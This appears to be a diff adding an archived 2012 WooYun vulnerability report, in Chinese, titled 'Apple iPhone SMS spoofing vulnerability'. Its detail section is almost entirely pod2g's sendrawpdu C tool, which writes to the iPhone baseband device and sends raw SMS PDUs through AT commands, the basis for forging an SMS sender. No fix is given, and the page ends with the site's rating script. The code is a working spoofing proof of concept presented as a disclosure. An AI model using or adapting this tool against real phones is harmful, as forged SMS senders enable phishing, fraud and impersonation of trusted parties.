@@ -1,0 +1,291 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		苹果iphone短信欺骗漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		苹果iphone短信欺骗漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/造孽">造孽</a> 
+</li><li>提交时间：		2012-08-28 17:35</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-08-28：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2012-08-28：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">苹果iphone中存在短信欺骗漏洞</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail"></p><pre><code>/*<br />
+ <br />
+ sendrawpdu (c) 2012 pod2g<br />
+ <br />
+ Command line tool, usage: sendrawpdu &lt;PDU data in hex&gt;<br />
+ <br />
+ - Code based on iphone-elite&#039;s sendmodem ( http://code.google.com/p/iphone-elite/wiki/sendmodem )<br />
+ - Just few modifications for SMS sending and iPhone 4 compatibility.<br />
+ <br />
+*/<br />
+<br />
+#include &lt;stdio.h&gt;<br />
+#include &lt;stdlib.h&gt;<br />
+#include &lt;unistd.h&gt;<br />
+#include &lt;string.h&gt;<br />
+#include &lt;fcntl.h&gt;<br />
+#include &lt;termios.h&gt;<br />
+#include &lt;errno.h&gt;<br />
+#include &lt;time.h&gt;<br />
+#include &lt;sys/ioctl.h&gt;<br />
+<br />
+#define BUFSIZE (65536+100)<br />
+unsigned char readbuf[BUFSIZE];<br />
+<br />
+static struct termios term;<br />
+static struct termios gOriginalTTYAttrs;<br />
+<br />
+void sendCmd(int fd, void *buf, size_t size);<br />
+void sendStrCmd(int fd, char *buf);<br />
+int readResp(int fd);<br />
+int initConn(int speed);<br />
+void closeConn(int fd);<br />
+void sendAt(int fd);<br />
+void at(int fd);<br />
+<br />
+void sendCmd(int fd, void *buf, size_t size) {<br />
+    if(write(fd, buf, size) == -1) {<br />
+        fprintf(stderr, &quot;sendCmd error. %s\n&quot;, strerror(errno));<br />
+        exit(1);<br />
+    }<br />
+}<br />
+<br />
+void sendStrCmd(int fd, char *buf) {<br />
+    sendCmd(fd, buf, strlen(buf));<br />
+}<br />
+<br />
+int readResp(int fd) {<br />
+    int len = 0;<br />
+    struct timeval timeout;<br />
+    int nfds = fd + 1;<br />
+    fd_set readfds;<br />
+    int select_ret;<br />
+    <br />
+    FD_ZERO(&amp;readfds);<br />
+    FD_SET(fd, &amp;readfds);<br />
+    <br />
+    // Wait a second<br />
+    timeout.tv_sec = 1;<br />
+    timeout.tv_usec = 500000;<br />
+    <br />
+    while ((select_ret = select(nfds, &amp;readfds, NULL, NULL, &amp;timeout)) &gt; 0) {<br />
+        len += read(fd, readbuf + len, BUFSIZE - len);<br />
+        FD_ZERO(&amp;readfds);<br />
+        FD_SET(fd, &amp;readfds);<br />
+        timeout.tv_sec = 0;<br />
+        timeout.tv_usec = 500000;<br />
+    }<br />
+    if (len &gt; 0) {<br />
+    }<br />
+    readbuf[len] = 0;<br />
+    fprintf(stderr,&quot;%s&quot;,readbuf);<br />
+    return len;<br />
+}<br />
+<br />
+int initConn(int speed) {<br />
+    int fd = open(&quot;/dev/dlci.spi-baseband.extra_0&quot;, O_RDWR | O_NOCTTY);<br />
+    <br />
+    if(fd == -1) {<br />
+        fprintf(stderr, &quot;%i(%s)\n&quot;, errno, strerror(errno));<br />
+        exit(1);<br />
+    }<br />
+    <br />
+    ioctl(fd, TIOCEXCL);<br />
+    fcntl(fd, F_SETFL, 0);<br />
+    <br />
+    tcgetattr(fd, &amp;term);<br />
+    gOriginalTTYAttrs = term;<br />
+    <br />
+    cfmakeraw(&amp;term);<br />
+    cfsetspeed(&amp;term, speed);<br />
+    term.c_cflag = CS8 | CLOCAL | CREAD;<br />
+    term.c_iflag = 0;<br />
+    term.c_oflag = 0;<br />
+    term.c_lflag = 0;<br />
+    term.c_cc[VMIN] = 0;<br />
+    term.c_cc[VTIME] = 0;<br />
+    tcsetattr(fd, TCSANOW, &amp;term);<br />
+    <br />
+    return fd;<br />
+}<br />
+<br />
+void closeConn(int fd) {<br />
+    tcdrain(fd);<br />
+    tcsetattr(fd, TCSANOW, &amp;gOriginalTTYAttrs);<br />
+    close(fd);<br />
+}<br />
+<br />
+void sendAt(int fd) {<br />
+    char cmd[5];<br />
+    sprintf(cmd,&quot;AT\r&quot;);<br />
+    sendCmd(fd, cmd, strlen(cmd));<br />
+}<br />
+<br />
+void at(int fd) {<br />
+    sendAt(fd);<br />
+    for (;;) {<br />
+        if(readResp(fd) != 0) {<br />
+            if(strstr((const char *)readbuf,&quot;OK&quot;) != NULL) {<br />
+                break;<br />
+            }<br />
+        }<br />
+        sendAt(fd);<br />
+    }<br />
+}<br />
+<br />
+int main(int argc, char **argv) {<br />
+    int fd;<br />
+    char cmd[1024];<br />
+    if(argc &lt; 2) {<br />
+        fprintf(stderr,&quot;usage: %s &lt;pdu data&gt;\n&quot;,argv[0]);<br />
+        exit(1);<br />
+    }<br />
+    fd = initConn(115200);<br />
+    at(fd);<br />
+    sendStrCmd(fd, &quot;AT+CMGF=0\r&quot;);<br />
+    readResp(fd);<br />
+    sprintf(cmd, &quot;AT+CMGS=%ld\r&quot;, strlen(argv[1])/2 - 1);<br />
+    sendStrCmd(fd, cmd);<br />
+    readResp(fd);<br />
+    sprintf(cmd,&quot;%s\032&quot;,argv[1]);<br />
+    sendStrCmd(fd, cmd);<br />
+    readResp(fd);<br />
+    closeConn(fd);<br />
+    return 0;<br />
+}</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/28173358afccd824f846eddaa771b69f20912d56.png" target="_blank"><img src="../images/28173358afccd824f846eddaa771b69f20912d56.png" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/造孽" title="造孽">造孽</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-011471" title="苹果iphone短信欺骗漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="11471";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
